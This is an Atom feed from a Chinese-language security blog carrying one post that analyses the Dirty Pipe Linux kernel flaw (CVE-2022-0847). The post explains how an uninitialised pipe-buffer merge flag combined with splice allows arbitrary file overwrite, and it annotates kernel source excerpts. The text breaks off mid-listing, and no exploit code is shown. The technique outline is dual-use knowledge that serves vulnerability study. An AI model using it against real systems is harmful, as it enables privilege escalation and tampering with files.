<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cyyyber&#39;s Blog</title>
  
  
  <link href="http://cyyyber.icu/atom.xml" rel="self"/>
  
  <link href="http://cyyyber.icu/"/>
  <updated>2022-03-16T10:46:50.169Z</updated>
  <id>http://cyyyber.icu/</id>
  
  <author>
    <name>Cyyyber</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2022-0847-DirtyPipe分析</title>
    <link href="http://cyyyber.icu/2022/03/16/CVE-2022-0847-DirtyPipe/"/>
    <id>http://cyyyber.icu/2022/03/16/CVE-2022-0847-DirtyPipe/</id>
    <published>2022-03-15T16:00:00.000Z</published>
    <updated>2022-03-16T10:46:50.169Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ul><li>pipe维护了一个<code>struct pipe_buffer</code>的数组，每个pipe_buffer指向一个page，page里存的就是pipe的数据</li><li>正常情况下，往pipe里写数据时会申请一个page，把数据拷贝到page里后再让pipe_buffer指向这个page。splice系统调用实现了一种零拷贝的技术，直接让pipe_buffer指向这个原始的数据page，这样就省去了内存拷贝的过程，提升效率</li><li>往pipe里写数据时不可能每次都正好是page_size的整数倍，如果每次写数据都要重新分配一个新的page来存，必然会造成空间的浪费。但是如果pipe_buffer的<code>PIPE_BUF_FLAG_CAN_MERGE</code>flag被置位，数据就会接着上一次的数据在同一个page中写入，而不是申请新的page，减少了空间的浪费</li><li>但是splice在给pipe_buffer赋值时没有初始化flag，这就造成之前被置位的<code>PIPE_BUF_FLAG_CAN_MERGE</code>flag不会被清除，所以只要先让所有的pipe_buffer的<code>PIPE_BUF_FLAG_CAN_MERGE</code>flag被置位，然后调用splice让pipe_buffer指向目标文件page cache，这时再向pipe里写数据就会直接修改page cache里的内容，造成任意文件覆盖漏洞</li></ul><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>以下源码来自<a href="https://elixir.bootlin.com/linux/v5.8.1/source">Linux5.8.1</a></p><h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><h3 id="关键数据结构"><a href="#关键数据结构" class="headerlink" title="关键数据结构"></a>关键数据结构</h3><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> files;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中bufs是一个<code>struct pipe_buffer</code>的数组，默认数量为16，每个pipe_buffer能存储一个page的数据。这16个page组成一个环形缓冲区，用来存储管道里的数据。</p><p><img src="https://s1.ax1x.com/2022/03/16/qpkSc8.png"></p><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>PIPE_BUF_FLAG_CAN_MERGE</code>就包含在flags字段中，它将影响page指向的内存页</p><h3 id="写pipe"><a href="#写pipe" class="headerlink" title="写pipe"></a>写pipe</h3><p>调用write向pipe里写数据时会经过层层调用，最终实际调用pipe_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保读者数量不为0</span></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment"> * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>); <span class="comment">// 要写入的数据的大小相对页帧大小的余数</span></span><br><span class="line">    <span class="comment">// 如果余数不为0，且pipe不为空</span></span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 当前头部的上一个缓冲区，因为要尝试将多余的数据与之前的数据合并</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; </span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果PIPE_BUF_FLAG_CAN_MERGE被置位，且buf能容下chars大小的数据</span></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将chars大小的数据写入缓冲区</span></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line">            <span class="comment">// 如果没有其余数据需要写入，则退出</span></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 确保对着数量不为0</span></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">        <span class="comment">// 如果pipe没被填满</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page; <span class="comment">// tmp_page用来临时存数据</span></span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果tmp_page还未分配，则用alloc_page分配一个page并赋值</span></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">            <span class="comment">// 自旋锁锁住读者等待队列</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">            <span class="comment">// 如果pipe已经被填满则进入下一次循环</span></span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先让头部指针指向下一个缓冲区</span></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<span class="comment">// 释放自旋锁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page; <span class="comment">//将之前分配的tmp_page赋值给buf-&gt;page</span></span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 如果创建pipe时没有指定O_DIRECT选项，则将flags设置为PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">            <span class="comment">// 所以只要创建pipe时不指定flags，就能将buffer的PIPE_BUF_FLAG_CAN_MERGE置位</span></span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>; <span class="comment">// tmp_page置空</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拷贝一页大小的数据到page里</span></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h2><p>splice系统调用主要由do_splice函数完成，do_splice根据输入的文件描述符进入不同的分支，在本次漏洞利用中因为in是普通文件，out是pipe，所以会进入<code>if (opipe)</code>这个分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine where to splice to/from.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_splice</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> __user *off_in,</span></span></span><br><span class="line"><span class="params"><span class="function">struct file *out, <span class="keyword">loff_t</span> __user *off_out,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line"><span class="keyword">loff_t</span> offset;</span><br><span class="line"><span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||</span><br><span class="line">     !(out-&gt;f_mode &amp; FMODE_WRITE)))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">ipipe = get_pipe_info(in, <span class="literal">true</span>);</span><br><span class="line">opipe = get_pipe_info(out, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// in和out都是pipe</span></span><br><span class="line"><span class="keyword">if</span> (ipipe &amp;&amp; opipe) &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只有in是pipe</span></span><br><span class="line"><span class="keyword">if</span> (ipipe) &#123;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 只有out是pipe</span></span><br><span class="line"><span class="keyword">if</span> (opipe) &#123;</span><br><span class="line">        <span class="comment">// 处理in和out的偏移</span></span><br><span class="line"><span class="keyword">if</span> (off_out)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"><span class="keyword">if</span> (off_in) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="keyword">sizeof</span>(<span class="keyword">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">offset = in-&gt;f_pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">pipe_lock(opipe);</span><br><span class="line">        <span class="comment">// 等待pipe有可用的缓冲区</span></span><br><span class="line">ret = wait_for_space(opipe, flags);</span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_space;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t try to read more the pipe has space for. */</span></span><br><span class="line">p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<span class="comment">// pipe可用空间</span></span><br><span class="line">len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<span class="comment">// 实际读取长度不能超过pipe可用空间</span></span><br><span class="line"></span><br><span class="line">ret = do_splice_to(in, &amp;offset, opipe, len, flags); <span class="comment">// 调用do_splice_to完成主要工作</span></span><br><span class="line">&#125;</span><br><span class="line">pipe_unlock(opipe);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">wakeup_pipe_readers(opipe);</span><br><span class="line"><span class="keyword">if</span> (!off_in)</span><br><span class="line">in-&gt;f_pos = offset;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (copy_to_user(off_in, &amp;offset, <span class="keyword">sizeof</span>(<span class="keyword">loff_t</span>)))</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在do_splice_to中又调用了输入文件的splice_read函数，之后又经过一系列的调用，最终由copy_page_to_iter_pipe完成关联page_cage和pipe缓冲区的工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 